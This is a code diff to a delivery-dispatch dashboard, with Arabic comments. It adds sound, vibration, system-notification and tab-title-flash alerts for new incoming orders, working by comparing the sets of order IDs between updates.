-      const d=await apiGet({action:"STAFF_MESSAGE",driverPhone:picked[i],msg:msg});
+      const d=await staffAction({action:"STAFF_MESSAGE",driverPhone:picked[i],msg:msg});
       (d&&d.success)?ok++:fail++;
     }catch(e){fail++;}
     await new Promise(r=>setTimeout(r,220));   /* خنق — لا نستنزف حصّة السكربت */
@@ -3369,5 +3526,105 @@ window.ccRetry=function(pk){
   const inp=document.getElementById("ctInput");
   inp.value=p.text;sendLeaderMsg();
 };
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   🔔 [V29 ← نحلة] تنبيه الطلبات الجديدة
+   ───────────────────────────────────────────────────────────────────────────
+   اللوحة كانت تُصدر صوتاً على **رسائل المحادثة وحدها** (_ccBeep)، ولا شيء
+   على الطلبات. فليدرٌ ينظر إلى شاشته لثوانٍ ثم يلتفت لا يعلم أن طلباً دخل
+   وبقي بلا كابتن — والدقائق الأولى هي كل الفرق بين طلبٍ يُوزَّع وزبونٍ
+   يلغي. الرادار يُحدَّث بصمت، والصمت هنا عطب لا هدوء.
+
+   🧮 والمقارنة **بمجموعة المعرّفات لا بالعدد**: لو دخل طلبٌ وخرج آخر في
+      النبضة نفسها (وهذا شائع في الذروة: يُكمَل طلبٌ بينما يُنشأ آخر) بقي
+      العدد كما هو تماماً بينما دخل طلبٌ جديد فعلاً ⇒ لا تنبيه أبداً.
+
+   🤫 وأوّل لقطة لا تُصدر صوتاً (_ordSeen === null): وإلا انفجرت اثنتا عشرة
+      نغمة دفعةً واحدة مع كل فتح للوحة أو إعادة ربطٍ بعد انقطاع.
+
+   ♻️ ويعيد استعمال _AC و _ccNotify و toast القائمة — لا سياق صوتي ثانٍ
+      ولا منطق إذنٍ مكرَّر.
+   ═══════════════════════════════════════════════════════════════════════════ */
+let _ordSeen=null;                       /* null = لم تصل لقطةٌ بعد */
+const _titleOrig=document.title;
+let _titleFlash=null;
+
+function _startTitleFlash(txt){
+  _stopTitleFlash();
+  let on=false;
+  _titleFlash=setInterval(()=>{ document.title=(on=!on)?txt:_titleOrig; },900);
+}
+function _stopTitleFlash(){
+  if(_titleFlash){ clearInterval(_titleFlash); _titleFlash=null; document.title=_titleOrig; }
+}
+
+function _newOrderBeep(count,label){
+  /* سقف ثلاث نغمات: عشرة طلبات دفعةً واحدة (بعد عودة الشبكة مثلاً) لا
+     تعني ثلاثين نغمة متتالية يقطعها الليدر بكتم الجهاز كلّه. */
+  const rounds=Math.min(count||1,3);
+  const a=_AC();
+  if(a){
+    for(let r=0;r<rounds;r++){
+      const base=a.currentTime+r*0.62;
+      [[660,0],[990,0.16]].forEach(([hz,off])=>{
+        try{
+          const o=a.createOscillator(), g=a.createGain();
+          o.type="sine"; o.frequency.value=hz;
+          o.connect(g); g.connect(a.destination);
+          g.gain.setValueAtTime(.0001, base+off);
+          g.gain.exponentialRampToValueAtTime(.32, base+off+0.02);
+          g.gain.exponentialRampToValueAtTime(.0001, base+off+0.32);
+          o.start(base+off); o.stop(base+off+0.34);
+        }catch(e){}
+      });
+    }
+  }
+  /* اهتزاز — يصل ولو كان الجهاز مكتوماً، وأكثر الليدرين على الهاتف. */
+  try{ if(navigator.vibrate) navigator.vibrate(rounds>1?[200,90,200,90,200]:[220,90,220]); }catch(e){}
+  /* إشعار نظام — يظهر ولو كانت اللوحة في الخلفية. ووسمه غير وسم المحادثة
+     حتى لا يدهس أحدهما الآخر. */
+  _ccNotify(count>1?`🆕 ${count} طلبات جديدة`:"🆕 طلب جديد",
+            label||"افتح لوحة الليدر",
+            "sufyan-order",
+            function(){ try{window.focus();}catch(e){} _stopTitleFlash(); });
+  /* وميض العنوان — الأثر الوحيد الذي يبقى مرئياً في شريط التبويبات. */
+  if(document.visibilityState!=="visible"){
+    _startTitleFlash(count>1?`🔴 ${count} طلبات جديدة`:"🔴 طلب جديد!");
+  }
+}
+
+/* تُنادى من مستمع active_orders بعد بناء liveOrd. */
+function _alertNewOrders(active){
+  try{
+    const ids=new Set(active.map(o=>String(o[O.ID]||"")));
+    if(_ordSeen===null){ _ordSeen=ids; return; }   /* 🤫 أوّل لقطة صامتة */
+    const fresh=[];
+    ids.forEach(id=>{ if(id&&!_ordSeen.has(id)) fresh.push(id); });
+    _ordSeen=ids;
+    if(!fresh.length)return;
+    const one=fresh.length===1
+      ? (function(){ const o=active.find(x=>String(x[O.ID])===fresh[0]);
+          return o?`${o[O.RES]||"مطعم"} · ${o[O.AREA]||""}`:""; })()
+      : "";
+    _newOrderBeep(fresh.length, one||`${fresh.length} طلبات بانتظار التوزيع`);
+  }catch(e){ console.warn("alertNewOrders:", e&&e.message); }
+}
+
+/* 🔓 فتح قفل الصوت عند أوّل تفاعل — سياسة المتصفّحات تمنع التشغيل التلقائي
+   قبل أي لمسة، فبلا هذا يبقى السياق معلّقاً وتصمت أوّل نغمة (وهي غالباً
+   أهمّها). ومعها نطلب إذن الإشعار مرّةً في السياق الذي يقبله المتصفّح. */
+["click","touchstart","keydown"].forEach(ev=>
+  document.addEventListener(ev,()=>{
+    try{
+      _AC();
+      if("Notification" in window && Notification.permission==="default" && !_notifAsked){
+        _notifAsked=true; Notification.requestPermission().catch(()=>{});
+      }
+    }catch(e){}
+  },{once:true,passive:true}));
+/* عودته إلى التبويب تُطفئ الوميض — رآه، فلا داعي لاستمراره. */
+document.addEventListener("visibilitychange",()=>{
+  if(document.visibilityState==="visible"){ try{_stopTitleFlash();}catch(e){} }
+});
 </script>
 </html>
